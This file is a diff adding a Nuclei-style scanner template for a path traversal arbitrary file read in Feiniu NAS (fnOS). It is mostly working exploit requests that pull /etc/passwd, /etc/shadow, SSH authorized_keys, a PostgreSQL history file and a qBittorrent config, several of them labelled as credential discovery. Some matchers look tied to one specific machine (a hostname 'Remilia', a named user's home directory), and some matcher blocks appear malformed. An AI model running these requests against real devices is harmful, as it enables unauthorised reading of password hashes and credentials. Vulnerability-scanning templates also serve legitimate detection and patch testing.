@@ -1,0 +1,135 @@
+id: feiniu-nas-arbitrary-file-read
+
+info:
+  name: Feiniu NAS - Arbitrary File Read
+  author: suiyideali
+  severity: high
+  description: |
+    Feiniu NAS (飞牛云NAS, fnOS) contains an arbitrary file read vulnerability via
+    path traversal in the /app-center-static/serviceicon/myapp/{0}/ endpoint.
+    Attackers can read sensitive system files by exploiting the 'size' parameter.
+  reference:
+    - https://github.com/feiniu/os
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  tags: feiniu,nas,fnos,file-read,path-traversal,lfi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - 'root:x:0:0:'
+        part: body
+
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../etc/shadow"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - 'root:\$[0-9]+'
+        part: body
+
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../etc/hostname"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Remilia"
+        part: body
+
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../proc/self/cmdline"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "nvidia"
+          - "docker"
+        part: body
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+# Extra sensitive files for credential discovery
+  - method: GET
+    path:
+      - "{{BaseURL}}/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../root/.ssh/authorized_keys"
+
+    matchers:
+      - type: word
+        words:
+          - "ssh-rsa"
+          - "ssh-ed25519"
+        part: body
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../home/yanggx98/.ssh/authorized_keys"
+
+    matchers:
+      - type: word
+        words:
+          - "ssh-rsa"
+          - "ssh-ed25519"
+        part: body
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../var/lib/postgresql/.psql_history"
+
+    matchers:
+      - type: word
+        words:
+          - "SELECT"
+          - "password"
+        part: body
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../home/qBittorrent/qBittorrent.conf"
+
+    matchers:
+      - type: word
+        words:
+          - "WebUI"
+          - "Password"
+        part: body
+        status:
+          - 200
+
+headless: false
